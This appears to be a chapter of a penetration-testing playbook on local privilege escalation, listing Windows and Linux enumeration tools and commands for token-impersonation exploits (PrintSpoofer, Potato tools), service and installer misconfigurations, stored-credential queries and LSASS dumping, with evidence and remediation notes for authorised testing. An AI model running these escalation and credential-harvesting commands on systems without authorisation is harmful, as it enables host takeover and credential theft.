# 07 — Local Privilege Escalation

**Goal:** user → SYSTEM/root on the host you hold. Enumerate first, exploit the specific misconfig second.

## Windows — enumerate
```powershell
.\winPEASx64.exe                       # broad automated
.\Seatbelt.exe -group=all
.\SharpUp.exe audit
Invoke-AllChecks                        # PowerUp
whoami /priv                            # look for the privileges below
whoami /groups
```

## Windows — token privileges → SYSTEM
`SeImpersonate` / `SeAssignPrimaryToken` (IIS, MSSQL, service accounts):
```cmd
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
JuicyPotatoNG.exe -t * -p cmd.exe
```
`SeBackup`/`SeRestore` → read SAM/SYSTEM or NTDS. `SeDebug` → dump LSASS. `SeLoadDriver`/`SeManageVolume` → known escalations.

## Windows — service / config misconfigs
```powershell
Get-ModifiableService ; Invoke-ServiceAbuse -Name '<svc>'      # weak service perms (PowerUp)
# Unquoted service path, weak binary/registry ACLs, DLL hijack
Get-ModifiableServiceFile
# AlwaysInstallElevated → malicious MSI
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Stored creds
cmdkey /list ; reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # autologon
# GPP cpassword in SYSVOL, Unattend.xml/sysprep.inf, saved RDP/WiFi creds
```
DPAPI (browser/creds vault), scheduled tasks, startup folders, credential files on disk.

## Linux — enumerate
```bash
./linpeas.sh
sudo -l                                 # #1 win — misconfigured sudo
find / -perm -4000 -type f 2>/dev/null  # SUID
getcap -r / 2>/dev/null                 # capabilities
crontab -l ; ls -la /etc/cron*          # cron jobs + writable scripts
```

## Linux — common wins
- **sudo** allowed binary → check **GTFOBins**. NOPASSWD entries especially.
- **SUID / capabilities** on exploitable binaries → GTFOBins.
- **Writable cron / PATH hijack / world-writable service files** run as root.
- **Kernel / package** version → known local exploit (read before running).
- **Docker/lxd group**, writable `/etc/passwd`, NFS `no_root_squash`.

## Evidence to capture
- `whoami`/`id` before & after, with the exploited condition in between.
- Screenshot the specific misconfig (unquoted path, sudo rule, SUID bin).
- Root cause + remediation (fix the ACL/policy, not just "patch").

## Pitfalls
- Enumerate fully first — the intended path is usually a config issue, not a kernel CVE.
- Potato technique varies by Windows build; have more than one ready.
